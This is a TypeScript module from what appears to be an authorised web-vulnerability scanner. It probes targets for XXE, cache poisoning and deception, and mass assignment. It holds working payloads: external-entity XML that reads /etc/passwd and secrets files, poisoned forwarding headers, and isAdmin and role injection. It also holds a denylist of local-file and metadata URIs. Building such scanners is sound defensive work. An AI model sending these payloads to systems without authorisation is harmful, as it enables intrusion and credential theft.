    /(?:file:\/\/|\/etc\/passwd|\/etc\/shadow|php:\/\/|expect:\/\/|gopher:\/\/|169\.254\.169\.254|metadata\.google\.internal)/i.test(customPayload)
  ) {
    throw new BrokerDenied('xxe_canary customPayload contains forbidden local-file, metadata, or destructive URI schemes.')
  }
  if (!customPayload.includes('{{canary_url}}') && !customPayload.includes('{{canary_dns_host}}')) {
    throw new BrokerDenied('xxe_canary customPayload must use {{canary_url}} or {{canary_dns_host}} CanaryBroker placeholders.')
  }
}

async function diffXxeCanary(
  ctx: DiffContext,
  canaryBroker: CanaryBroker | undefined,
  grant: Grant,
  signal: AbortSignal,
): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  if (req.customPayload !== undefined) {
    validateXxeCustomPayload(req.customPayload)
  }
  if (!canaryBroker) {
    return { verdict: 'inconclusive', summary: 'CanaryBroker is unavailable; XXE OOB probing needs a Guardian-operated listener.', details: {} }
  }
  let info = canaryBroker.listenerInfo()
  if (!info.running) info = await canaryBroker.startListener()
  const base = info.effectiveBaseUrl
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  if (base) {
    let host = ''
    try { host = new URL(base).hostname } catch { /* handled below */ }
    if (!host || (isPrivateOrLoopbackHost(host) && !localLab)) {
      return {
        verdict: 'inconclusive',
        summary: 'Canary base URL is private/loopback; configure GUARDIAN_CANARY_PUBLIC_URL before XXE callback probing on a public target.',
        details: { canaryHost: host },
      }
    }
  }

  const method = req.method && req.method !== 'GET' ? req.method : 'POST'
  const xmlHeaders = { 'Content-Type': 'application/xml', ...(req.headers ?? {}) }
  const ctrlBody = `<?xml version="1.0" encoding="UTF-8"?><guardian><ping>${randToken(6)}</ping></guardian>`
  const ctrlEx = await send({ method, pathAndQuery: req.pathAndQuery, body: ctrlBody, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
  if (!ctrlEx) return { verdict: 'inconclusive', summary: 'XXE control request failed.', details: {} }

  const runId = req.runId ?? 'surface-engine'
  const mint = (label: string) => canaryBroker.mintCanary(runId, label, ctx.origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)

  const minted: Array<{ variant: string; token: string }> = []
  if (req.customPayload) {
    const c = mint('xxe:custom')
    minted.push({ variant: 'custom', token: c.token })
    const body = req.customPayload
      .replaceAll('{{canary_url}}', c.httpUrl)
      .replaceAll('{{canary_dns_host}}', c.dnsHost)
    await send({ method, pathAndQuery: req.pathAndQuery, body, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
  } else {
    const c1 = mint('xxe:general_entity')
    minted.push({ variant: 'general_entity', token: c1.token })
    await send({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gxxe SYSTEM "${c1.httpUrl}">]><root>&gxxe;</root>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    })

    const c2 = mint('xxe:param_entity')
    minted.push({ variant: 'param_entity', token: c2.token })
    await send({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % gxxep SYSTEM "${c2.httpUrl}"> %gxxep;]><root>ok</root>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    })

    const c3 = mint('xxe:svg_dtd')
    minted.push({ variant: 'svg_dtd', token: c3.token })
    await send({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY svgx SYSTEM "${c3.httpUrl}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&svgx;</text></svg>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    })
  }

  const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
  // In-band fallback: resolve a virtual-filesystem entity and look for the resolved content in the
  // response. Only a real resolution can surface these markers, so hardened parsers stay silent.
  const inband: Array<Record<string, unknown>> = []
  let inbandHit = false
  const resolvedMarkers = /root:x:0:0:|API_KEY=rbs_[a-z0-9]+_[0-9a-f]{12}|SESSION_SECRET=/
  const inbandBody = (entity: string) =>
    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>guardian-issuer</issuer></root>`
  for (const entity of ['file:///etc/passwd', 'file:///app/config/secrets.env']) {
    const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///app/.env'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
    const probe = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody(entity), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
    if (!ctrl || !probe) continue
    const marker = resolvedMarkers.test(probe.body)
    const diverged = probe.status !== ctrl.status || responseSimilarity(ctrl.body, probe.body) < 0.9
    inband.push({ entity, controlStatus: ctrl.status, probeStatus: probe.status, marker, diverged })
    if (marker) {
      anomalies.push({
        type: 'xxe_entity_resolved_inband',
        entity,
        controlStatus: ctrl.status,
        acceptedStatus: probe.status,
        marker: 'resolved-file-content',
      })
      inbandHit = true
      break
    }
  }

  const hits = new Map<string, ReturnType<CanaryBroker['checkCanary']>>()
  while (!signal.aborted) {
    for (const m of minted) {
      const res = canaryBroker.checkCanary(m.token, req.storage ? { storage: req.storage, runId } : undefined)
      if (res.hit) hits.set(m.token, res)
    }
    if (hits.size > 0 || Date.now() >= deadline) break
    await new Promise<void>(resolve => setTimeout(resolve, 200))
  }

  const results = minted.map(m => ({ variant: m.variant, token: m.token, hit: hits.has(m.token) }))
  for (const r of results.filter(x => x.hit)) {
    anomalies.push({ type: 'xxe_canary_callback', variant: r.variant, token: r.token })
  }
  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? inbandHit
        ? 'XML external entity resolved server-local content into the response (in-band proof, no OOB callback).'
        : 'Correlated out-of-band CanaryBroker callback observed from benign XML external entity probe.'
      : 'No out-of-band XXE callback observed.',
    details: { results, inband, suggestedReplayKind: 'http_chain' },
  }
}

async function diffCachePoisonDeception(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, runner, send, anomalies, notes } = ctx
  const crossActor: Array<Record<string, unknown>> = []
  // Header-less cache inference: warm the entry as one actor, then prove a different actor receives
  // the warmed body while its own fresh (cache-busted) response differs. This needs no Age/X-Cache.
  if (req.ownerPersona && req.otherPersona && req.ownerPersona !== req.otherPersona) {
    const warmPaths: string[] = [req.pathAndQuery]
    for (const path of warmPaths.slice(0, 1)) {
      const warmPath = appendCacheBuster(path, randomUUID())
      const warm = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: warmPath, persona: req.ownerPersona, probeClass: 'cache_poison_deception' })
      if (!warm.ok || warm.ex.status < 200 || warm.ex.status >= 300) {
        crossActor.push({ path, skipped: 'warm' })
        continue
      }
      runner.stage(warm.ex)
      const repeat = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: warmPath, persona: req.otherPersona, probeClass: 'cache_differential', cacheVerify: true })
      if (!repeat.ok) { crossActor.push({ path, skipped: 'repeat' }); continue }
      runner.stage(repeat.ex)
      const freshPath = appendCacheBuster(req.crossControlPath ?? path, randomUUID())
      const fresh = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: freshPath, persona: req.otherPersona, probeClass: 'cache_differential' })
      if (!fresh.ok) { crossActor.push({ path, skipped: 'fresh' }); continue }
      runner.stage(fresh.ex)
      const simWarmRepeat = responseSimilarity(warm.ex.body, repeat.ex.body)
      const simFreshRepeat = responseSimilarity(fresh.ex.body, repeat.ex.body)
      const simWarmFresh = responseSimilarity(warm.ex.body, fresh.ex.body)
      const ownerCanary = /rb[cs]_[a-z0-9]+_[0-9a-f]{12}/.exec(warm.ex.body)?.[0] ?? null
      const ownerMarker = req.actorMarkers?.owner
      const markerInWarm = ownerMarker ? warm.ex.body.includes(ownerMarker) : true
      const markerInRepeat = ownerMarker ? repeat.ex.body.includes(ownerMarker) : true
      const canaryRepeated = ownerCanary ? repeat.ex.body.includes(ownerCanary) && !fresh.ex.body.includes(ownerCanary) : false
      const cacheHitObserved = simWarmRepeat >= 0.9 && simFreshRepeat < 0.95 && simWarmFresh < 0.95 &&
        markerInWarm && markerInRepeat && canaryRepeated
      crossActor.push({ path, freshPath: req.crossControlPath ?? null, simWarmRepeat, simFreshRepeat, simWarmFresh, ownerCanary: Boolean(ownerCanary), markerInRepeat, canaryRepeated, hit: cacheHitObserved })
      notes.push(`cache cross-actor warm/repeat=${simWarmRepeat.toFixed(3)} fresh/repeat=${simFreshRepeat.toFixed(3)} hit=${cacheHitObserved}`)
      if (cacheHitObserved) {
        const basePath = path.split('?')[0] + (path.includes('?') ? `?${path.split('?').slice(1).join('?')}` : '')
        const controlBase = req.crossControlPath ?? basePath
        anomalies.push({
          type: 'cache_poisoning',
          proof: 'body_repeat',
          path: basePath,
          controlPath: controlBase,
          poisonPersona: req.ownerPersona,
          verifyPersona: req.otherPersona,
          actorDifferential: true,
          cacheHit: false,
          similarity: simWarmRepeat,
          freshOtherSimilarity: simFreshRepeat,
          suggestedReplayKind: 'cache_differential',
        })
        anomalies.push({
          type: 'web_cache_deception',
          mode: 'cross_actor',
          deceptionUrl: basePath,
          similarity: simWarmRepeat,
          freshOtherSimilarity: simFreshRepeat,
          cacheHitObserved: true,
          ownerPersona: req.ownerPersona,
          otherPersona: req.otherPersona,
          suggestedReplayKind: 'cache_differential',
        })
        return {
          verdict: 'signal',
          summary: 'A response warmed by one actor was served to a different actor while its fresh response differed (cache hit inferred without headers).',
          details: { mode: 'cross_actor', simWarmRepeat, simFreshRepeat, simWarmFresh, cacheHitObserved },
        }
      }
    }
  }
  const ctrlGcb = randomUUID()
  const ctrlPath = appendCacheBuster(req.pathAndQuery, ctrlGcb)
  const ctrlEx = await send({
    method: 'GET',
    pathAndQuery: ctrlPath,
    headers: req.headers,
    probeClass: 'cache_poison_deception',
  })
  if (!ctrlEx) return { verdict: 'inconclusive', summary: 'Cache control baseline failed.', details: {} }

  const marker = `poison-${randToken(6)}.guardian.invalid`
  const headerVariants: Array<{ name: string; headers: Record<string, string>; checkMarker: string }> = [
    { name: 'X-Forwarded-Host', headers: { 'X-Forwarded-Host': marker }, checkMarker: marker },
    { name: 'X-Host', headers: { 'X-Host': marker }, checkMarker: marker },
    { name: 'X-Forwarded-Scheme', headers: { 'X-Forwarded-Scheme': 'http' }, checkMarker: '' },
    { name: 'X-Original-URL', headers: { 'X-Original-URL': `/guardian-cache-${randToken(4)}` }, checkMarker: 'guardian-cache-' },
    { name: 'X-Rewrite-URL', headers: { 'X-Rewrite-URL': `/guardian-cache-${randToken(4)}` }, checkMarker: 'guardian-cache-' },
  ]

  const variantsOut: Array<Record<string, unknown>> = []
  for (const hv of headerVariants) {
    const probeGcb = randomUUID()
    const probeUrl = appendCacheBuster(req.pathAndQuery, probeGcb)
    const poisonEx = await send({
      method: 'GET',
      pathAndQuery: probeUrl,
      headers: { ...(req.headers ?? {}), ...hv.headers },
      probeClass: 'cache_poison_deception',
    })
    if (!poisonEx) continue

    // Clean unauthenticated victim verify GET to exact same probeUrl with cacheVerify=true
    const verifyRes = await runner.send({
      origin: ctx.origin,
      method: 'GET',
      pathAndQuery: probeUrl,
      headers: req.headers,
      persona: undefined,
      probeClass: 'cache_differential',
      cacheVerify: true,
    })
    if (!verifyRes.ok) continue
    const verifyEx = verifyRes.ex
    runner.stage(verifyEx)

    const age = Number(verifyEx.respHeaders.age ?? NaN)
    const cacheHitHeader = [
      verifyEx.respHeaders['x-cache'],
      verifyEx.respHeaders['cf-cache-status'],
      verifyEx.respHeaders['x-cache-status'],
      verifyEx.respHeaders['x-proxy-cache'],
    ].some(v => typeof v === 'string' && /\bhit\b/i.test(v))
    const cacheHit = (Number.isFinite(age) && age > 0) || cacheHitHeader
    const markerPersisted = hv.checkMarker ? verifyEx.body.includes(hv.checkMarker) : false
    const simCtrlVerify = responseSimilarity(ctrlEx.body, verifyEx.body)
    const simPoisonVerify = responseSimilarity(poisonEx.body, verifyEx.body)
    const diffPersisted = simCtrlVerify < 0.95 && simPoisonVerify >= 0.85

    variantsOut.push({
      header: hv.name,
      probeGcb,
      cacheHit,
      markerPersisted,
      diffPersisted,
      verifyStatus: verifyEx.status,
    })

    if (markerPersisted || (cacheHit && diffPersisted)) {
      anomalies.push({
        type: 'cache_poisoning',
        header: hv.name,
        probeGcb,
        cacheHit,
        markerPersisted,
        suggestedReplayKind: 'cache_differential',
      })
    }
  }

  // Web Cache Deception variant when authenticated persona is provided
  if (req.persona) {
    const [rawPath, qs] = req.pathAndQuery.split('?')
    const deceptionBase = `${rawPath.replace(/\/+$/, '')}/nonexistent-${randToken(6)}.css${qs ? `?${qs}` : ''}`
    const deceptionGcb = randomUUID()
    const deceptionUrl = appendCacheBuster(deceptionBase, deceptionGcb)
    const authEx = await send({
      method: 'GET',
      pathAndQuery: deceptionUrl,
      headers: req.headers,
      persona: req.persona,
      probeClass: 'cache_poison_deception',
    })
    notes.push(`cache deception auth probe ${deceptionUrl.slice(0, 120)} -> ${authEx?.status ?? 'error'}`)
    if (authEx && authEx.status >= 200 && authEx.status < 300) {
      const verifyRes = await runner.send({
        origin: ctx.origin,
        method: 'GET',
        pathAndQuery: deceptionUrl,
        headers: req.headers,
        persona: undefined,
        probeClass: 'cache_differential',
        cacheVerify: true,
      })
      if (verifyRes.ok) {
        runner.stage(verifyRes.ex)
        const sim = responseSimilarity(authEx.body, verifyRes.ex.body)
        const age = Number(verifyRes.ex.respHeaders.age ?? NaN)
        const hitHdr = /\bhit\b/i.test(verifyRes.ex.respHeaders['x-cache'] ?? verifyRes.ex.respHeaders['cf-cache-status'] ?? '')
        const cached = hitHdr || (Number.isFinite(age) && age > 0)
        notes.push(`cache deception verify status=${verifyRes.ex.status} similarity=${sim.toFixed(3)} cacheHit=${hitHdr} age=${Number.isFinite(age) ? age : 'n/a'}`)
        // Token-set similarity under-weights tiny HTML bodies (a single cache-comment marker can cost
        // ~0.25), so require an explicit cache HIT/Age header and a moderate body match instead.
        if (verifyRes.ex.status === 200 && cached && sim >= 0.6) {
          anomalies.push({
            type: 'web_cache_deception',
            deceptionUrl,
            similarity: sim,
            cacheHit: hitHdr,
            suggestedReplayKind: 'cache_differential',
          })
        }
      }
    }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? 'Cache poisoning or cache deception differential persisted to a clean unauthenticated fetch; build a cache_differential Replay Spec.'
      : 'No cache poisoning or cache deception persistence observed.',
    details: { variants: variantsOut, crossActor, suggestedReplayKind: 'cache_differential' },
  }
}

async function diffMassAssignment(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseGet = await send({
    method: 'GET',
    pathAndQuery: req.pathAndQuery,
    headers: req.headers,
    session: req.session,
    csrfBind: req.csrfBind,
  })
  if (!baseGet) return { verdict: 'inconclusive', summary: 'Baseline GET failed for mass_assignment.', details: {} }

  let baseJson: Record<string, unknown> | null = null
  try {
    const parsed = JSON.parse(baseGet.body) as unknown
    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) baseJson = parsed as Record<string, unknown>
  } catch {
    baseJson = null
  }

  const baseKeys = baseJson ? Object.keys(baseJson).filter(k => /^(?:tenant_id|owner_id|team_id|org_id|account_id|role|role_id|plan|plan_id|tier|status|state|payment_state|total|amount|price|permissions|is_admin|isAdmin|admin|verified|email_verified|active|enabled|visibility|return_url|avatar_url)$/i.test(k)) : []
  const defaults = ['role', 'isAdmin', 'admin', 'is_admin', 'plan', 'tier', 'verified', 'emailVerified', 'permissions', 'orgId', 'tenantId', 'tenant_id', 'owner_id', 'team_id', 'teamField', 'orgField', 'grant', 'level', 'status', 'state', 'payment_state', 'total', 'amount', 'visibility']
  const candidates = req.candidateFields?.length ? req.candidateFields : [...new Set([...baseKeys, ...defaults])]
  const method: 'POST' | 'PUT' | 'PATCH' = req.method === 'PUT' || req.method === 'PATCH' ? req.method : 'POST'
  const location: SurfaceParamLocation = req.paramLocation === 'form' ? 'form' : 'json'
  const results: Array<Record<string, unknown>> = []
  const suppressed: string[] = []

  for (const field of candidates.slice(0, 12)) {
    const isBoolField = /^(?:is|has|verified|admin|emailVerified)/i.test(field)
    const testVal = isBoolField ? 'true' : `guardian_ma_${randToken(4)}`
    const typedVal: string | boolean = testVal === 'true' && location === 'json'
      ? true
      : testVal
    const injected = injectUniversalParam({
      pathAndQuery: req.pathAndQuery,
      param: field,
      paramLocation: location,
      value: typedVal,
      method,
      headers: req.headers,
      jsonBody: req.jsonBody,
      formBody: req.formBody,
      session: req.session,
      csrfBind: req.csrfBind,
    })
    const writeEx = await send(injected)
    if (!writeEx || writeEx.status >= 500) continue
    const followGet = await send({
      method: 'GET',
      pathAndQuery: req.pathAndQuery,
      headers: req.headers,
      session: req.session,
    })
    const persisted = (() => {
      if (!followGet) return false
      let nextJson: Record<string, unknown> | null = null
      try {
        const parsed = JSON.parse(followGet.body) as unknown
        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
          nextJson = parsed as Record<string, unknown>
        }
      } catch {
        nextJson = null
      }
      if (isBoolField || typedVal === true || testVal === 'true') {
        if (nextJson) {
          if (!(field in nextJson)) return false
          const nextVal = nextJson[field]
          const isNowTrue = nextVal === true || nextVal === 'true'
          if (!isNowTrue) return false
          if (baseJson && field in baseJson) {
            return nextVal !== baseJson[field]
          }
          return true
        }
        const escapedField = field.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
        const fieldTrueRe = new RegExp(`["']?${escapedField}["']?\\s*[:=]\\s*(?:"true"|'true'|true\\b)`, 'i')
        const wasTrue = baseGet ? fieldTrueRe.test(baseGet.body) : false
        return !wasTrue && fieldTrueRe.test(followGet.body)
      }
      if (nextJson && field in nextJson) {
        const changed = !baseJson || !(field in baseJson) || nextJson[field] !== baseJson[field]
        return changed && String(nextJson[field]) === String(typedVal)
      }
      return followGet.body.includes(String(typedVal))
    })()
    results.push({ field, writeStatus: writeEx.status, persisted })
    if (persisted) {
      // Classify before submitting: privilege/ownership fields are always meaningful; lifecycle
      // fields only prove mass assignment on commerce/order-shaped resources.
      const privilegeField = /(role|roles|admin|permission|privilege|grant|level|tenant|owner|team|org|plan|tier|verified|email_verified)/i
      const lifecycleField = /^(?:status|state|payment_state|total|amount|price|return_url)$/i
      const commerceRoute = /(?:order|purchase|checkout|cart|payment|refund|shipment|reversal|disbursement|credit)/i
      const emit = privilegeField.test(field) || (lifecycleField.test(field) && commerceRoute.test(req.pathAndQuery))
      if (!emit) { suppressed.push(field); continue }
      anomalies.push({ type: 'mass_assignment', field, writeStatus: writeEx.status, persisted: true })
      if (baseJson && field in baseJson) {
        const restoreVal = location === 'json' && (typeof baseJson[field] === 'boolean' || typeof baseJson[field] === 'number' || typeof baseJson[field] === 'string')
          ? (baseJson[field] as string | number | boolean)
          : String(baseJson[field])
        await send(injectUniversalParam({
          pathAndQuery: req.pathAndQuery,
          param: field,
          paramLocation: location,
          value: restoreVal,
          method,
          headers: req.headers,
          jsonBody: req.jsonBody,
          formBody: req.formBody,
          session: req.session,
          csrfBind: req.csrfBind,
        }))
      }
      break
    }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? `Privileged field "${String(anomalies[0].field)}" persisted after ${method}; confirm via http_chain Replay Spec.`
      : 'No mass assignment persistence observed.',
    details: { results, suppressed, suggestedReplayKind: 'http_chain' },
  }
}

export async function probeDifferential(
  req: ProbeDifferentialRequest,
  broker: RequestBroker,
  grant: Grant,
  canaryBroker: CanaryBroker | undefined,
  signal: AbortSignal,
): Promise<DifferentialResult> {
  const started = Date.now()
  const origin = preflight(req.origin, grant)
  const probePathname = req.pathAndQuery.split('?')[0] || '/'
  // The site root is the approved baseline page, not a differential probe target. Re-probing it
  // duplicates the baseline request (and, after crash recovery, violates the no-duplicate invariant).
  if (probePathname === '/') {
    return {
      probeClass: req.probeClass,
      origin,
      pathAndQuery: req.pathAndQuery,
      verdict: 'inconclusive',
      summary: 'Baseline route is not differential-probed.',
      anomalies: [],
      details: { skipped: 'baseline_root' },
      requestsSent: 0,
      exchangeIds: [],
      stoppedReason: null,
      notes: ['Skipped differential probing of the baseline site root.'],
      durationMs: Date.now() - started,
    }
  }
  const max = clampMaxRequests(req.maxRequests ?? 60)
  const runner = new ProbeRunner(broker, grant, signal, max, req.persona, req.onExchange)
  const notes: string[] = []
  const anomalies: Array<Record<string, unknown>> = []
  let outcome: DiffOutcome = { verdict: 'inconclusive', summary: 'Probe did not run.', details: {} }

  if (!safeProbePath(req.pathAndQuery.split('?')[0].replace(/\{\{[a-zA-Z0-9_]+\}\}/g, 'x'))) {
    throw new BrokerDenied('pathAndQuery is invalid or blocked by the destructive-payload denylist.')
  }
  if (req.probeClass === 'xxe_canary' && req.customPayload !== undefined) {
    validateXxeCustomPayload(req.customPayload)
  }

  const send = async (r: InjectedRequest & { persona?: string }): Promise<BrokerExchangeResult | null> => {
    const res = await runner.send({
      origin,
      ...(req.session ? { session: req.session } : {}),
      ...(req.csrfBind !== undefined ? { csrfBind: req.csrfBind } : {}),
      ...(req.runId ? { runId: req.runId } : {}),
      ...(req.assignmentId ? { assignmentId: req.assignmentId } : {}),
      ...r,
    })
    if (!res.ok) {
      notes.push(`${r.method} ${r.pathAndQuery.slice(0, 80)} -> ${res.kind}: ${res.message.slice(0, 120)}`)
      if (res.kind === 'approval') runner.stop('approval_required')
      return null
    }
    runner.stage(res.ex)
    return res.ex
  }
  const ctx: DiffContext = { req, origin, runner, notes, anomalies, send }

  // GraphQL variable probes need a real operation that binds the argument under test.
  if (req.paramLocation === 'graphql_var' && !req.graphqlQuery) {
    try {
      await resolveGraphqlArgQuery(req, send)
    } catch (err) {
      if (err instanceof StopProbe) throw err
      notes.push(`graphql operation resolution failed: ${err instanceof Error ? err.message.slice(0, 120) : String(err)}`)
    }
  }

  try {
    switch (req.probeClass) {
      case 'sqli_boolean': outcome = await diffBooleanDifferential(ctx); break
      case 'sqli_time_diff': outcome = await diffSqlTimeDifferential(ctx, grant); break
      case 'ssti_math': outcome = await diffTemplateMath(ctx); break
      case 'ssrf_canary': outcome = await diffCanaryCallback(ctx, canaryBroker, grant, signal); break
      case 'nosqli_type': outcome = await diffOperatorTypes(ctx); break
      case 'path_traversal_benign':
        // A named file/path parameter gets the genuine jail-escape oracle; pure path-shape probing
        // falls back to the benign normalization differential.
        outcome = req.param && (req.paramLocation ?? 'query') !== 'path'
          ? await diffFileTraversal(ctx)
          : await diffPathNormalization(ctx)
        break
      case 'command_injection': outcome = await diffCommandInjection(ctx); break
      case 'graphql_audit': outcome = await diffGraphqlSurface(ctx, grant); break
      case 'authz_matrix': outcome = await diffAuthorizationMatrix(ctx); break
      case 'workflow_invariant': outcome = await diffWorkflowInvariant(ctx); break
      case 'xss_context': outcome = await diffXssContext(ctx); break
      case 'auth_protocol_audit': outcome = await diffAuthProtocolAudit(ctx, canaryBroker, grant); break
      case 'xxe_canary': outcome = await diffXxeCanary(ctx, canaryBroker, grant, signal); break
      case 'cache_poison_deception': outcome = await diffCachePoisonDeception(ctx); break
      case 'mass_assignment': outcome = await diffMassAssignment(ctx); break
      case 'csrf_state_change': outcome = await diffCsrfStateChange(ctx); break
      case 'webhook_signature_bypass': outcome = await diffWebhookSignature(ctx); break
      case 'open_redirect_differential': outcome = await diffOpenRedirectDifferential(ctx); break
    }
  } catch (err) {
    if (err instanceof StopProbe) {
      outcome = { verdict: anomalies.length > 0 ? 'signal' : 'inconclusive', summary: `Probe stopped early (${err.reason}).`, details: outcome.details }
    } else if (err instanceof BrokerDenied) {
      runner.stopReason ??= 'denied'
      outcome = { verdict: 'inconclusive', summary: err.message, details: {} }
    } else {
      throw err
    }
  }

  return {
    probeClass: req.probeClass,
    origin,
    pathAndQuery: req.pathAndQuery,
    verdict: outcome.verdict,
    summary: outcome.summary,
    anomalies,
    details: outcome.details,
    requestsSent: runner.sent,
    exchangeIds: runner.exchangeIds,
    stoppedReason: runner.stopReason,
    notes,
    durationMs: Date.now() - started,
  }
}

// run_safe_templates: vetted declarative templates executed natively through RequestBroker

export interface RunSafeTemplatesRequest {
  origin: string
  /** tech_fingerprint tags + /repos dependency tags used to auto-filter templates */
  techFingerprint?: string[]
  templateIds?: string[]
  /** CVE ids from lockfile/trivy/curated advisories; auto-selects matching templates. */
  cveIds?: string[]
  /** Discovery-derived paths used to resolve {{discovered_protected_path}} / {{discovered_api_path}}. */
  discoveredPaths?: {
    protectedPaths?: string[]
    apiPaths?: string[]
  }
  maxTemplates?: number
  maxRequests?: number
  persona?: string
  runId?: string
  assignmentId?: string
  storage?: Store
  templatesDir?: string
  onExchange?: (exchange: BrokerExchangeResult) => string | void
}

export interface TemplateMatch {
  templateId: string
  name: string
  severity: SafeTemplate['severity']
  factKind: 'cve_hypothesis' | 'candidate_lead'
  cve?: string
  cwe?: string
  tech: string[]
  method: string
  path: string
  status: number
  evidence: string[]
  controlStatus: number | null
  exchangeId?: string
  note: string
}

export interface RunSafeTemplatesResult {
  origin: string
  templatesAvailable: number
  templatesSelected: number
  templatesRun: number
  requestsSent: number
  maxRequests: number
  matches: TemplateMatch[]
  suppressed: Array<{ templateId: string; reason: 'spa_catchall' | 'control_matched' | 'no_match' }>
  skipped: Array<{ id: string; reason: string }>
  loadErrors: Array<{ file: string; error: string }>
  calibration: SurfaceCalibration | null
  baselineSignature: string
  stoppedReason: StopReason | null
  exchangeIds: string[]
  durationMs: number
}

export const defaultTemplateLimit = 60
export const templateLimitCeiling = 250

function substitute(text: string, vars: Record<string, string>, encode: boolean): string {
  return text.replace(/\{\{(rand|guardian_canary_http|guardian_canary_dns|discovered_protected_path|discovered_api_path)\}\}/g, (_m, name: string) => {
    const value = vars[name] ?? ''
    // Discovered paths are complete, already-safe path templates: never percent-encode the leading "/".
    return encode && !name.startsWith('discovered_') ? encodeURIComponent(value) : value
  })
}

function templateNeedsDiscoveredPath(template: SafeTemplate): boolean {
  const serialized = `${template.request.path} ${template.control?.path ?? ''}`
  return /\{\{discovered_(?:protected|api)_path\}\}/.test(serialized)
}

function pathResolves(template: SafeTemplate, vars: Record<string, string>): boolean {
  const resolved = substitute(template.request.path, vars, true)
  if (!resolved || resolved.includes('{{')) return false
  if (!resolved.startsWith('/') && !/^https?:\/\//.test(resolved)) return false
  return true
}

function matcherPartText(part: 'body' | 'header' | 'all', ex: BrokerExchangeResult): string {
  const headers = Object.entries(ex.respHeaders).map(([k, v]) => `${k}: ${v}`).join('\n')
  if (part === 'header') return headers
  if (part === 'body') return ex.body
  return `${headers}\n\n${ex.body}`
}

function snippetAround(text: string, needle: string, caseInsensitive = true): string {
  const hay = caseInsensitive ? text.toLowerCase() : text
  const idx = hay.indexOf(caseInsensitive ? needle.toLowerCase() : needle)
  if (idx < 0) return needle.slice(0, 80)
  return text.slice(Math.max(0, idx - 30), idx + needle.length + 50).replace(/\s+/g, ' ').slice(0, 160)
}

function evaluateMatchers(
  template: SafeTemplate,
  ex: BrokerExchangeResult,
  canaryHit: { hit: boolean; protocol?: string } | null,
): { matched: boolean; evidence: string[] } {
  const evidence: string[] = []
  const results = template.matchers.map((m: TemplateMatcher) => {
    if (m.type === 'status') {
      const ok = m.status.includes(ex.status)
      if (ok) evidence.push(`status ${ex.status}`)
      return ok
    }
    if (m.type === 'canary') {
      const ok = Boolean(canaryHit?.hit) && (m.protocol === 'any' || canaryHit?.protocol === m.protocol)
      if (ok) evidence.push(`canary callback (${canaryHit?.protocol ?? 'unknown'})`)
      return ok
    }
    const text = matcherPartText(m.part, ex)
    let found: boolean
    let hitText = ''
    if (m.type === 'word') {
      const hits = m.words.filter(w => text.toLowerCase().includes(w.toLowerCase()))
      found = m.condition === 'and' ? hits.length === m.words.length : hits.length > 0
      hitText = hits[0] ? snippetAround(text, hits[0]) : ''
    } else {
      const hits = m.regex.filter(r => new RegExp(r, 'im').test(text))
      found = m.condition === 'and' ? hits.length === m.regex.length : hits.length > 0
      const first = hits[0] ? new RegExp(hits[0], 'im').exec(text) : null
      hitText = first ? first[0].slice(0, 160) : ''
    }
    const ok = m.negative ? !found : found
    if (ok && !m.negative && hitText) evidence.push(hitText)
    return ok
  })
  const matched = template.matchersCondition === 'and' ? results.every(Boolean) : results.some(Boolean)
  return { matched, evidence: matched ? evidence.slice(0, 5) : [] }
}

export async function runSafeTemplates(
  req: RunSafeTemplatesRequest,
  broker: RequestBroker,
  grant: Grant,
  canaryBroker: CanaryBroker | undefined,
  signal: AbortSignal,
): Promise<RunSafeTemplatesResult> {
  const started = Date.now()
  const origin = preflight(req.origin, grant)
  const tier = grant.tier ?? 1
  const max = clampMaxRequests(req.maxRequests)
  const runner = new ProbeRunner(broker, grant, signal, max, req.persona, req.onExchange)
  const loaded = loadSafeTemplates({ dir: req.templatesDir })
  const limit = Math.max(1, Math.min(req.maxTemplates ?? defaultTemplateLimit, templateLimitCeiling))
  const cveTemplateIds = req.cveIds?.length
    ? selectTemplateIdsForCves(loaded.templates, req.cveIds)
    : []
  const templateIds = [...new Set([...(req.templateIds ?? []), ...cveTemplateIds])]
  const selection = selectSafeTemplates(loaded.templates, {
    techTags: req.techFingerprint,
    ...(templateIds.length ? { templateIds } : {}),
    ...(req.cveIds?.length ? { cveIds: req.cveIds } : {}),
    tier,
    maxTemplates: limit,
  })
  const matches: TemplateMatch[] = []
  const suppressed: RunSafeTemplatesResult['suppressed'] = []
  const skipped = [...selection.skipped]
